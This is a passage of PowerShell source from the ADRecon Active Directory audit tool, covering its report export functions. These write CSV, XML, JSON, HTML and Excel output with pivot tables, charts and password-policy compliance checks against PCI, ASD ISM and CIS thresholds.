            $HTMLFiles = Get-ChildItem -Path $HTMLPath -name
            $HTML = $HTMLFiles | ConvertTo-HTML -Title "ADRecon" -Property @{Label="Table of Contents";Expression={"<a href='$($_)'>$($_)</a>"}} -Head $Header

            Add-Type -AssemblyName System.Web
            [System.Web.HttpUtility]::HtmlDecode($HTML) | Out-File -FilePath $ADFileName
        }
        Else
        {
            If ($ADRObj -is [array])
            {
                $ADRObj | Select-Object * | ConvertTo-HTML -As Table -Head $Header | Out-File -FilePath $ADFileName
            }
            Else
            {
                ConvertTo-HTML -InputObject $ADRObj -As Table -Head $Header | Out-File -FilePath $ADFileName
            }
        }
    }
    Catch
    {
        Write-Warning "[Export-ADRHTML] Failed to export $($ADFileName)."
        Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
    }
}

Function Export-ADR
{
<#
.SYNOPSIS
    Helper function for all output types supported.

.DESCRIPTION
    Helper function for all output types supported.

.PARAMETER ADObjectDN
    [PSObject]
    ADRObj

.PARAMETER ADROutputDir
    [String]
    Path for ADRecon output folder.

.PARAMETER OutputType
    [array]
    Output Type.

.PARAMETER ADRModuleName
    [String]
    Module Name.

.OUTPUTS
    STDOUT, CSV, XML, JSON and/or HTML file, etc.
#>
    param(
        [Parameter(Mandatory = $true)]
        [PSObject] $ADRObj,

        [Parameter(Mandatory = $true)]
        [String] $ADROutputDir,

        [Parameter(Mandatory = $true)]
        [array] $OutputType,

        [Parameter(Mandatory = $true)]
        [String] $ADRModuleName
    )

    Switch ($OutputType)
    {
        'STDOUT'
        {
            If ($ADRModuleName -ne "AboutADRecon")
            {
                If ($ADRObj -is [array])
                {
                    # Fix for InvalidOperationException: The object of type "Microsoft.PowerShell.Commands.Internal.Format.FormatStartData" is not valid or not in the correct sequence.
                    $ADRObj | Out-String -Stream
                }
                Else
                {
                    # Fix for InvalidOperationException: The object of type "Microsoft.PowerShell.Commands.Internal.Format.FormatStartData" is not valid or not in the correct sequence.
                    $ADRObj | Format-List | Out-String -Stream
                }
            }
        }
        'CSV'
        {
            $ADFileName  = -join($ADROutputDir,'\','CSV-Files','\',$ADRModuleName,'.csv')
            Export-ADRCSV -ADRObj $ADRObj -ADFileName $ADFileName
        }
        'XML'
        {
            $ADFileName  = -join($ADROutputDir,'\','XML-Files','\',$ADRModuleName,'.xml')
            Export-ADRXML -ADRObj $ADRObj -ADFileName $ADFileName
        }
        'JSON'
        {
            $ADFileName  = -join($ADROutputDir,'\','JSON-Files','\',$ADRModuleName,'.json')
            Export-ADRJSON -ADRObj $ADRObj -ADFileName $ADFileName
        }
        'HTML'
        {
            $ADFileName  = -join($ADROutputDir,'\','HTML-Files','\',$ADRModuleName,'.html')
            Export-ADRHTML -ADRObj $ADRObj -ADFileName $ADFileName -ADROutputDir $ADROutputDir
        }
    }
}

Function Get-ADRExcelComObj
{
<#
.SYNOPSIS
    Creates a ComObject to interact with Microsoft Excel.

.DESCRIPTION
    Creates a ComObject to interact with Microsoft Excel if installed, else warning is raised.

.OUTPUTS
    [System.__ComObject] and [System.MarshalByRefObject]
    Creates global variables $excel and $workbook.
#>

    #Check if Excel is installed.
    Try
    {
        # Suppress verbose output
        $SaveVerbosePreference = $script:VerbosePreference
        $script:VerbosePreference = 'SilentlyContinue'
        $global:excel = New-Object -ComObject excel.application
        If ($SaveVerbosePreference)
        {
            $script:VerbosePreference = $SaveVerbosePreference
            Remove-Variable SaveVerbosePreference
        }
    }
    Catch
    {
        If ($SaveVerbosePreference)
        {
            $script:VerbosePreference = $SaveVerbosePreference
            Remove-Variable SaveVerbosePreference
        }
        Write-Warning "[Get-ADRExcelComObj] Excel does not appear to be installed. Skipping generation of ADRecon-Report.xlsx. Use the -GenExcel parameter to generate the ADRecon-Report.xslx on a host with Microsoft Excel installed."
        Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        Return $null
    }
    $excel.Visible = $true
    $excel.Interactive = $false
    $global:workbook = $excel.Workbooks.Add()
    If ($workbook.Worksheets.Count -eq 3)
    {
        $workbook.WorkSheets.Item(3).Delete()
        $workbook.WorkSheets.Item(2).Delete()
    }
}

Function Get-ADRExcelComObjRelease
{
<#
.SYNOPSIS
    Releases the ComObject created to interact with Microsoft Excel.

.DESCRIPTION
    Releases the ComObject created to interact with Microsoft Excel.

.PARAMETER ComObjtoRelease
    ComObjtoRelease

.PARAMETER Final
    Final
#>
    param(
        [Parameter(Mandatory = $true)]
        $ComObjtoRelease,

        [Parameter(Mandatory = $false)]
        [bool] $Final = $false
    )
    # https://msdn.microsoft.com/en-us/library/system.runtime.interopservices.marshal.releasecomobject(v=vs.110).aspx
    # https://msdn.microsoft.com/en-us/library/system.runtime.interopservices.marshal.finalreleasecomobject(v=vs.110).aspx
    If ($Final)
    {
        [System.Runtime.InteropServices.Marshal]::FinalReleaseComObject($ComObjtoRelease) | Out-Null
    }
    Else
    {
        [System.Runtime.InteropServices.Marshal]::ReleaseComObject($ComObjtoRelease) | Out-Null
    }
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()
}

Function Get-ADRExcelWorkbook
{
<#
.SYNOPSIS
    Adds a WorkSheet to the Workbook.

.DESCRIPTION
    Adds a WorkSheet to the Workbook using the $workboook global variable and assigns it a name.

.PARAMETER name
    [string]
    Name of the WorkSheet.
#>
    param (
        [Parameter(Mandatory = $true)]
        [string] $name
    )

    $workbook.Worksheets.Add() | Out-Null
    $worksheet = $workbook.Worksheets.Item(1)
    $worksheet.Name = $name

    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}

Function Get-ADRExcelImport
{
<#
.SYNOPSIS
    Helper to import CSV to the current WorkSheet.

.DESCRIPTION
    Helper to import CSV to the current WorkSheet. Supports two methods.

.PARAMETER ADFileName
    [string]
    Filename of the CSV file to import.

.PARAMETER method
    [int]
    Method to use for the import.

.PARAMETER row
    [int]
    Row.

.PARAMETER column
    [int]
    Column.
#>
    param (
        [Parameter(Mandatory = $true)]
        [string] $ADFileName,

        [Parameter(Mandatory = $false)]
        [int] $method = 1,

        [Parameter(Mandatory = $false)]
        [int] $row = 1,

        [Parameter(Mandatory = $false)]
        [int] $column = 1
    )

    $excel.ScreenUpdating = $false
    If ($method -eq 1)
    {
        If (Test-Path $ADFileName)
        {
            $worksheet = $workbook.Worksheets.Item(1)
            $TxtConnector = ("TEXT;" + $ADFileName)
            $CellRef = $worksheet.Range("A1")
            #Build, use and remove the text file connector
            $Connector = $worksheet.QueryTables.add($TxtConnector, $CellRef)

            #65001: Unicode (UTF-8)
            $worksheet.QueryTables.item($Connector.name).TextFilePlatform = 65001
            $worksheet.QueryTables.item($Connector.name).TextFileCommaDelimiter = $True
            $worksheet.QueryTables.item($Connector.name).TextFileParseType = 1
            $worksheet.QueryTables.item($Connector.name).Refresh() | Out-Null
            $worksheet.QueryTables.item($Connector.name).delete()

            Get-ADRExcelComObjRelease -ComObjtoRelease $CellRef
            Remove-Variable CellRef
            Get-ADRExcelComObjRelease -ComObjtoRelease $Connector
            Remove-Variable Connector

            $listObject = $worksheet.ListObjects.Add([Microsoft.Office.Interop.Excel.XlListObjectSourceType]::xlSrcRange, $worksheet.UsedRange, $null, [Microsoft.Office.Interop.Excel.XlYesNoGuess]::xlYes, $null)
            $listObject.TableStyle = "TableStyleLight2" # Style Cheat Sheet: https://msdn.microsoft.com/en-au/library/documentformat.openxml.spreadsheet.tablestyle.aspx
            $worksheet.UsedRange.EntireColumn.AutoFit() | Out-Null
        }
        Remove-Variable ADFileName
    }
    Elseif ($method -eq 2)
    {
        $worksheet = $workbook.Worksheets.Item(1)
        If (Test-Path $ADFileName)
        {
            $ADTemp = Import-Csv -Path $ADFileName
            $ADTemp | ForEach-Object {
                Foreach ($prop in $_.PSObject.Properties)
                {
                    $worksheet.Cells.Item($row, $column) = $prop.Name
                    $worksheet.Cells.Item($row, $column + 1) = $prop.Value
                    $row++
                }
            }
            Remove-Variable ADTemp
            $listObject = $worksheet.ListObjects.Add([Microsoft.Office.Interop.Excel.XlListObjectSourceType]::xlSrcRange, $worksheet.UsedRange, $null, [Microsoft.Office.Interop.Excel.XlYesNoGuess]::xlYes, $null)
            $listObject.TableStyle = "TableStyleLight2" # Style Cheat Sheet: https://msdn.microsoft.com/en-au/library/documentformat.openxml.spreadsheet.tablestyle.aspx
            $usedRange = $worksheet.UsedRange
            $usedRange.EntireColumn.AutoFit() | Out-Null
        }
        Else
        {
            $worksheet.Cells.Item($row, $column) = "Error!"
        }
        Remove-Variable ADFileName
    }
    $excel.ScreenUpdating = $true

    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}

# Thanks Anant Shrivastava for the suggestion of using Pivot Tables for generation of the Stats sheets.
Function Get-ADRExcelPivotTable
{
<#
.SYNOPSIS
    Helper to add Pivot Table to the current WorkSheet.

.DESCRIPTION
    Helper to add Pivot Table to the current WorkSheet.

.PARAMETER SrcSheetName
    [string]
    Source Sheet Name.

.PARAMETER PivotTableName
    [string]
    Pivot Table Name.

.PARAMETER PivotRows
    [array]
    Row names from Source Sheet.

.PARAMETER PivotColumns
    [array]
    Column names from Source Sheet.

.PARAMETER PivotFilters
    [array]
    Row/Column names from Source Sheet to use as filters.

.PARAMETER PivotValues
    [array]
    Row/Column names from Source Sheet to use for Values.

.PARAMETER PivotPercentage
    [array]
    Row/Column names from Source Sheet to use for Percentage.

.PARAMETER PivotLocation
    [array]
    Location of the Pivot Table in Row/Column.
#>
    param (
        [Parameter(Mandatory = $true)]
        [string] $SrcSheetName,

        [Parameter(Mandatory = $true)]
        [string] $PivotTableName,

        [Parameter(Mandatory = $false)]
        [array] $PivotRows,

        [Parameter(Mandatory = $false)]
        [array] $PivotColumns,

        [Parameter(Mandatory = $false)]
        [array] $PivotFilters,

        [Parameter(Mandatory = $false)]
        [array] $PivotValues,

        [Parameter(Mandatory = $false)]
        [array] $PivotPercentage,

        [Parameter(Mandatory = $false)]
        [string] $PivotLocation = "R1C1"
    )

    $excel.ScreenUpdating = $false
    $SrcWorksheet = $workbook.Sheets.Item($SrcSheetName)
    $workbook.ShowPivotTableFieldList = $false

    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlpivottablesourcetype-enumeration-excel
    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlpivottableversionlist-enumeration-excel
    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlpivotfieldorientation-enumeration-excel
    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/constants-enumeration-excel
    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlsortorder-enumeration-excel
    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlpivotfiltertype-enumeration-excel

    # xlDatabase = 1 # this just means local sheet data
    # xlPivotTableVersion12 = 3 # Excel 2007
    $PivotFailed = $false
    Try
    {
        $PivotCaches = $workbook.PivotCaches().Create([Microsoft.Office.Interop.Excel.XlPivotTableSourceType]::xlDatabase, $SrcWorksheet.UsedRange, [Microsoft.Office.Interop.Excel.XlPivotTableVersionList]::xlPivotTableVersion12)
    }
    Catch
    {
        $PivotFailed = $true
        Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
    }
    If ( $PivotFailed -eq $true )
    {
        $rows = $SrcWorksheet.UsedRange.Rows.Count
        If ($SrcSheetName -eq "Computer SPNs")
        {
            $PivotCols = "A1:B"
        }
        ElseIf ($SrcSheetName -eq "Users")
        {
            $PivotCols = "A1:AI"
        }
        $UsedRange = $SrcWorksheet.Range($PivotCols+$rows)
        $PivotCaches = $workbook.PivotCaches().Create([Microsoft.Office.Interop.Excel.XlPivotTableSourceType]::xlDatabase, $UsedRange, [Microsoft.Office.Interop.Excel.XlPivotTableVersionList]::xlPivotTableVersion12)
        Remove-Variable rows
	Remove-Variable PivotCols
        Remove-Variable UsedRange
    }
    Remove-Variable PivotFailed
    $PivotTable = $PivotCaches.CreatePivotTable($PivotLocation,$PivotTableName)
    # $workbook.ShowPivotTableFieldList = $true

    If ($PivotRows)
    {
        ForEach ($Row in $PivotRows)
        {
            $PivotField = $PivotTable.PivotFields($Row)
            $PivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlRowField
        }
    }

    If ($PivotColumns)
    {
        ForEach ($Col in $PivotColumns)
        {
            $PivotField = $PivotTable.PivotFields($Col)
            $PivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlColumnField
        }
    }

    If ($PivotFilters)
    {
        ForEach ($Fil in $PivotFilters)
        {
            $PivotField = $PivotTable.PivotFields($Fil)
            $PivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlPageField
        }
    }

    If ($PivotValues)
    {
        ForEach ($Val in $PivotValues)
        {
            $PivotField = $PivotTable.PivotFields($Val)
            $PivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlDataField
        }
    }

    If ($PivotPercentage)
    {
        ForEach ($Val in $PivotPercentage)
        {
            $PivotField = $PivotTable.PivotFields($Val)
            $PivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlDataField
            $PivotField.Calculation = [Microsoft.Office.Interop.Excel.XlPivotFieldCalculation]::xlPercentOfTotal
            $PivotTable.ShowValuesRow = $false
        }
    }

    # $PivotFields.Caption = ""
    $excel.ScreenUpdating = $true

    Get-ADRExcelComObjRelease -ComObjtoRelease $PivotField
    Remove-Variable PivotField
    Get-ADRExcelComObjRelease -ComObjtoRelease $PivotTable
    Remove-Variable PivotTable
    Get-ADRExcelComObjRelease -ComObjtoRelease $PivotCaches
    Remove-Variable PivotCaches
    Get-ADRExcelComObjRelease -ComObjtoRelease $SrcWorksheet
    Remove-Variable SrcWorksheet
}

Function Get-ADRExcelAttributeStats
{
<#
.SYNOPSIS
    Helper to add Attribute Stats to the current WorkSheet.

.DESCRIPTION
    Helper to add Attribute Stats to the current WorkSheet.

.PARAMETER SrcSheetName
    [string]
    Source Sheet Name.

.PARAMETER Title1
    [string]
    Title1.

.PARAMETER Title2
    [string]
    Title2.

.PARAMETER ObjAttributes
    [OrderedDictionary]
    Attributes.
#>
    param (
        [Parameter(Mandatory = $true)]
        [string] $SrcSheetName,

        [Parameter(Mandatory = $true)]
        [string] $Title1,

        [Parameter(Mandatory = $true)]
        [string] $Title2,

        [Parameter(Mandatory = $true)]
        [System.Object] $ObjAttributes
    )

    $excel.ScreenUpdating = $false
    $worksheet = $workbook.Worksheets.Item(1)
    $SrcWorksheet = $workbook.Sheets.Item($SrcSheetName)

    $row = 1
    $column = 1
    $worksheet.Cells.Item($row, $column) = $Title1
    $worksheet.Cells.Item($row,$column).Style = "Heading 2"
    $worksheet.Cells.Item($row,$column).HorizontalAlignment = -4108
    $MergeCells = $worksheet.Range("A1:C1")
    $MergeCells.Select() | Out-Null
    $MergeCells.MergeCells = $true
    Remove-Variable MergeCells

    Get-ADRExcelPivotTable -SrcSheetName $SrcSheetName -PivotTableName "User Status" -PivotRows @("Enabled") -PivotValues @("UserName") -PivotPercentage @("UserName") -PivotLocation "R2C1"
    $excel.ScreenUpdating = $false

    $row = 2
    "Type","Count","Percentage" | ForEach-Object {
        $worksheet.Cells.Item($row, $column) = $_
        $worksheet.Cells.Item($row, $column).Font.Bold = $True
        $column++
    }

    $row = 3
    $column = 1
    For($row = 3; $row -le 6; $row++)
    {
        $temptext = [string] $worksheet.Cells.Item($row, $column).Text
        switch ($temptext.ToUpper())
        {
            "TRUE" { $worksheet.Cells.Item($row, $column) = "Enabled" }
            "FALSE" { $worksheet.Cells.Item($row, $column) = "Disabled" }
            "GRAND TOTAL" { $worksheet.Cells.Item($row, $column) = "Total" }
        }
    }

    $row = 1
    $column = 6
    $worksheet.Cells.Item($row, $column) = $Title2
    $worksheet.Cells.Item($row,$column).Style = "Heading 2"
    $worksheet.Cells.Item($row,$column).HorizontalAlignment = -4108
    $MergeCells = $worksheet.Range("F1:L1")
    $MergeCells.Select() | Out-Null
    $MergeCells.MergeCells = $true
    Remove-Variable MergeCells

    $row++
    "Category","Enabled Count","Enabled Percentage","Disabled Count","Disabled Percentage","Total Count","Total Percentage" | ForEach-Object {
        $worksheet.Cells.Item($row, $column) = $_
        $worksheet.Cells.Item($row, $column).Font.Bold = $True
        $column++
    }

    $ExcelColumn = ($SrcWorksheet.Columns.Find("Enabled"))
    $EnabledColAddress = "$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1)):$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1))"

    $column = 6
    $i = 2

    $ObjAttributes.keys | ForEach-Object {
        $ExcelColumn = ($SrcWorksheet.Columns.Find($_))
        $ColAddress = "$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1)):$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1))"
        $row++
        $i++
        If ($_ -eq "Delegation Typ")
        {
            $worksheet.Cells.Item($row, $column) = "Unconstrained Delegation"
        }
        ElseIf ($_ -eq "Delegation Type")
        {
            $worksheet.Cells.Item($row, $column) = "Constrained Delegation"
        }
        Else
        {
            $worksheet.Cells.Item($row, $column).Formula = '=' + $SrcWorksheet.Name + '!' + $ExcelColumn.Address($false,$false)
        }
        $worksheet.Cells.Item($row, $column+1).Formula = '=COUNTIFS(' + $SrcWorksheet.Name + '!' + $EnabledColAddress + ',"TRUE",' + $SrcWorksheet.Name + '!' + $ColAddress + ',' + $ObjAttributes[$_] + ')'
        $worksheet.Cells.Item($row, $column+2).Formula = '=IFERROR(G' + $i + '/VLOOKUP("Enabled",A3:B6,2,FALSE),0)'
        $worksheet.Cells.Item($row, $column+3).Formula = '=COUNTIFS(' + $SrcWorksheet.Name + '!' + $EnabledColAddress + ',"FALSE",' + $SrcWorksheet.Name + '!' + $ColAddress + ',' + $ObjAttributes[$_] + ')'
        $worksheet.Cells.Item($row, $column+4).Formula = '=IFERROR(I' + $i + '/VLOOKUP("Disabled",A3:B6,2,FALSE),0)'
        If ( ($_ -eq "SIDHistory") -or ($_ -eq "ms-ds-CreatorSid") )
        {
            $worksheet.Cells.Item($row, $column+5).Formula = '=COUNTIF(' + $SrcWorksheet.Name + '!' + $ColAddress + ',' + $ObjAttributes[$_] + ')-1'
        }
        Else
        {
            $worksheet.Cells.Item($row, $column+5).Formula = '=COUNTIF(' + $SrcWorksheet.Name + '!' + $ColAddress + ',' + $ObjAttributes[$_] + ')'
        }
        $worksheet.Cells.Item($row, $column+6).Formula = '=IFERROR(K' + $i + '/VLOOKUP("Total",A3:B6,2,FALSE),0)'
    }

    # http://www.excelhowto.com/macros/formatting-a-range-of-cells-in-excel-vba/
    "H", "J" , "L" | ForEach-Object {
        $rng = $_ + $($row - $ObjAttributes.Count + 1) + ":" + $_ + $($row)
        $worksheet.Range($rng).NumberFormat = "0.00%"
    }
    $excel.ScreenUpdating = $true

    Get-ADRExcelComObjRelease -ComObjtoRelease $SrcWorksheet
    Remove-Variable SrcWorksheet
    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}

Function Get-ADRExcelChart
{
<#
.SYNOPSIS
    Helper to add charts to the current WorkSheet.

.DESCRIPTION
    Helper to add charts to the current WorkSheet.

.PARAMETER ChartType
    [int]
    Chart Type.

.PARAMETER ChartLayout
    [int]
    Chart Layout.

.PARAMETER ChartTitle
    [string]
    Title of the Chart.

.PARAMETER RangetoCover
    WorkSheet Range to be covered by the Chart.

.PARAMETER ChartData
    Data for the Chart.

.PARAMETER StartRow
    Start row to calculate data for the Chart.

.PARAMETER StartColumn
    Start column to calculate data for the Chart.
#>
    param (
        [Parameter(Mandatory = $true)]
        [string] $ChartType,

        [Parameter(Mandatory = $true)]
        [int] $ChartLayout,

        [Parameter(Mandatory = $true)]
        [string] $ChartTitle,

        [Parameter(Mandatory = $true)]
        $RangetoCover,

        [Parameter(Mandatory = $false)]
        $ChartData = $null,

        [Parameter(Mandatory = $false)]
        $StartRow = $null,

        [Parameter(Mandatory = $false)]
        $StartColumn = $null
    )

    $excel.ScreenUpdating = $false
    $excel.DisplayAlerts = $false
    $worksheet = $workbook.Worksheets.Item(1)
    $chart = $worksheet.Shapes.AddChart().Chart
    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlcharttype-enumeration-excel
    $chart.chartType = [int]([Microsoft.Office.Interop.Excel.XLChartType]::$ChartType)
    $chart.ApplyLayout($ChartLayout)
    If ($null -eq $ChartData)
    {
        If ($null -eq $StartRow)
        {
            $start = $worksheet.Range("A1")
        }
        Else
        {
            $start = $worksheet.Range($StartRow)
        }
        # get the last cell
        $X = $worksheet.Range($start,$start.End([Microsoft.Office.Interop.Excel.XLDirection]::xlDown))
        If ($null -eq $StartColumn)
        {
            $start = $worksheet.Range("B1")
        }
        Else
        {
            $start = $worksheet.Range($StartColumn)
        }
        # get the last cell
        $Y = $worksheet.Range($start,$start.End([Microsoft.Office.Interop.Excel.XLDirection]::xlDown))
        $ChartData = $worksheet.Range($X,$Y)

        Get-ADRExcelComObjRelease -ComObjtoRelease $X
        Remove-Variable X
        Get-ADRExcelComObjRelease -ComObjtoRelease $Y
        Remove-Variable Y
        Get-ADRExcelComObjRelease -ComObjtoRelease $start
        Remove-Variable start
    }
    $chart.SetSourceData($ChartData)
    # https://docs.microsoft.com/en-us/dotnet/api/microsoft.office.interop.excel.chartclass.plotby?redirectedfrom=MSDN&view=excel-pia#Microsoft_Office_Interop_Excel_ChartClass_PlotBy
    $chart.PlotBy = [Microsoft.Office.Interop.Excel.XlRowCol]::xlColumns
    $chart.seriesCollection(1).Select() | Out-Null
    $chart.SeriesCollection(1).ApplyDataLabels() | out-Null
    # modify the chart title
    $chart.HasTitle = $True
    $chart.ChartTitle.Text = $ChartTitle
    # Reposition the Chart
    $temp = $worksheet.Range($RangetoCover)
    # $chart.parent.placement = 3
    $chart.parent.top = $temp.Top
    $chart.parent.left = $temp.Left
    $chart.parent.width = $temp.Width
    If ($ChartTitle -ne "Privileged Groups in AD")
    {
        $chart.parent.height = $temp.Height
    }
    # $chart.Legend.Delete()
    $excel.ScreenUpdating = $true
    $excel.DisplayAlerts = $true

    Get-ADRExcelComObjRelease -ComObjtoRelease $chart
    Remove-Variable chart
    Get-ADRExcelComObjRelease -ComObjtoRelease $ChartData
    Remove-Variable ChartData
    Get-ADRExcelComObjRelease -ComObjtoRelease $temp
    Remove-Variable temp
    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}

Function Get-ADRExcelSort
{
<#
.SYNOPSIS
    Sorts a WorkSheet in the active Workbook.

.DESCRIPTION
    Sorts a WorkSheet in the active Workbook.

.PARAMETER ColumnName
    [string]
    Name of the Column.
#>
    param (
        [Parameter(Mandatory = $true)]
        [string] $ColumnName
    )

    $worksheet = $workbook.Worksheets.Item(1)
    $worksheet.Activate();

    $ExcelColumn = ($worksheet.Columns.Find($ColumnName))
    If ($ExcelColumn)
    {
        If ($ExcelColumn.Text -ne $ColumnName)
        {
            $BeginAddress = $ExcelColumn.Address(0,0,1,1)
            $End = $False
            Do {
                Write-Verbose "[Get-ADRExcelSort] $($ExcelColumn.Text) selected instead of $($ColumnName) in the $($worksheet.Name) worksheet."
                $ExcelColumn = ($worksheet.Columns.FindNext($ExcelColumn))
                $Address = $ExcelColumn.Address(0,0,1,1)
                If ( ($Address -eq $BeginAddress) -or ($ExcelColumn.Text -eq $ColumnName) )
                {
                    $End = $True
                }
            } Until ($End -eq $True)
        }
        If ($ExcelColumn.Text -eq $ColumnName)
        {
            # Sort by Column
            $workSheet.ListObjects.Item(1).Sort.SortFields.Clear()
            $workSheet.ListObjects.Item(1).Sort.SortFields.Add($ExcelColumn) | Out-Null
            $worksheet.ListObjects.Item(1).Sort.Apply()
        }
        Else
        {
            Write-Verbose "[Get-ADRExcelSort] $($ColumnName) not found in the $($worksheet.Name) worksheet."
        }
    }
    Else
    {
        Write-Verbose "[Get-ADRExcelSort] $($ColumnName) not found in the $($worksheet.Name) worksheet."
    }
    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}

Function Export-ADRExcel
{
<#
.SYNOPSIS
    Automates the generation of the ADRecon report.

.DESCRIPTION
    Automates the generation of the ADRecon report. If specific files exist, they are imported into the ADRecon report.

.PARAMETER ExcelPath
    [string]
    Path for ADRecon output folder containing the CSV files to generate the ADRecon-Report.xlsx

.OUTPUTS
    Creates the ADRecon-Report.xlsx report in the folder.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $ExcelPath
    )

    $ExcelPath = $((Convert-Path $ExcelPath).TrimEnd("\"))
    $ReportPath = -join($ExcelPath,'\','CSV-Files')
    If (!(Test-Path $ReportPath))
    {
        Write-Warning "[Export-ADRExcel] Could not locate the CSV-Files directory ... Exiting"
        Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        Return $null
    }
    Get-ADRExcelComObj
    If ($excel)
    {
        Write-Output "[*] Generating ADRecon-Report.xlsx"

        $ADFileName = -join($ReportPath,'\','AboutADRecon.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            $workbook.Worksheets.Item(1).Name = "About ADRecon"
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(3,2) , "https://github.com/sense-of-security/ADRecon", "" , "", "github.com/sense-of-security/ADRecon") | Out-Null
            $workbook.Worksheets.Item(1).UsedRange.EntireColumn.AutoFit() | Out-Null
        }

        $ADFileName = -join($ReportPath,'\','Forest.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Forest"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','Domain.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Domain"
            Get-ADRExcelImport -ADFileName $ADFileName
            $DomainObj = Import-CSV -Path $ADFileName
            Remove-Variable ADFileName
            $DomainName = -join($DomainObj[0].Value,"-")
            Remove-Variable DomainObj
        }

        $ADFileName = -join($ReportPath,'\','Trusts.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Trusts"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','Subnets.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Subnets"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','Sites.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Sites"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','FineGrainedPasswordPolicy.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Fine Grained Password Policy"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\','DefaultPasswordPolicy.csv')
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "Default Password Policy"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            $excel.ScreenUpdating = $false
            $worksheet = $workbook.Worksheets.Item(1)
            # https://docs.microsoft.com/en-us/office/vba/api/excel.xlhalign
            $worksheet.Range("B2:G10").HorizontalAlignment = -4108
            # https://docs.microsoft.com/en-us/office/vba/api/excel.range.borderaround

            "A2:B10", "C2:D10", "E2:F10", "G2:G10" | ForEach-Object {
                $worksheet.Range($_).BorderAround(1) | Out-Null
            }

            # https://docs.microsoft.com/en-us/dotnet/api/microsoft.office.interop.excel.formatconditions.add?view=excel-pia
            # $worksheet.Range().FormatConditions.Add
            # http://dmcritchie.mvps.org/excel/colors.htm
            # Values for Font.ColorIndex

            $ObjValues = @(
            # PCI Enforce password history (passwords)
            "C2", '=IF(B2<4,TRUE, FALSE)'

            # PCI Maximum password age (days)
            "C3", '=IF(OR(B3=0,B3>90),TRUE, FALSE)'

            # PCI Minimum password age (days)

            # PCI Minimum password length (characters)
            "C5", '=IF(B5<7,TRUE, FALSE)'

            # PCI Password must meet complexity requirements
            "C6", '=IF(B6<>TRUE,TRUE, FALSE)'

            # PCI Store password using reversible encryption for all users in the domain

            # PCI Account lockout duration (mins)
            "C8", '=IF(AND(B8>=1,B8<30),TRUE, FALSE)'

            # PCI Account lockout threshold (attempts)
            "C9", '=IF(OR(B9=0,B9>6),TRUE, FALSE)'

            # PCI Reset account lockout counter after (mins)

            # ASD ISM Enforce password history (passwords)
            "E2", '=IF(B2<8,TRUE, FALSE)'

            # ASD ISM Maximum password age (days)
            "E3", '=IF(OR(B3=0,B3>90),TRUE, FALSE)'

            # ASD ISM Minimum password age (days)
            "E4", '=IF(B4=0,TRUE, FALSE)'

            # ASD ISM Minimum password length (characters)
            "E5", '=IF(B5<13,TRUE, FALSE)'

            # ASD ISM Password must meet complexity requirements
            "E6", '=IF(B6<>TRUE,TRUE, FALSE)'

            # ASD ISM Store password using reversible encryption for all users in the domain

            # ASD ISM Account lockout duration (mins)

            # ASD ISM Account lockout threshold (attempts)
            "E9", '=IF(OR(B9=0,B9>5),TRUE, FALSE)'

            # ASD ISM Reset account lockout counter after (mins)

            # CIS Benchmark Enforce password history (passwords)
            "G2", '=IF(B2<24,TRUE, FALSE)'

            # CIS Benchmark Maximum password age (days)
            "G3", '=IF(OR(B3=0,B3>60),TRUE, FALSE)'

            # CIS Benchmark Minimum password age (days)
            "G4", '=IF(B4=0,TRUE, FALSE)'
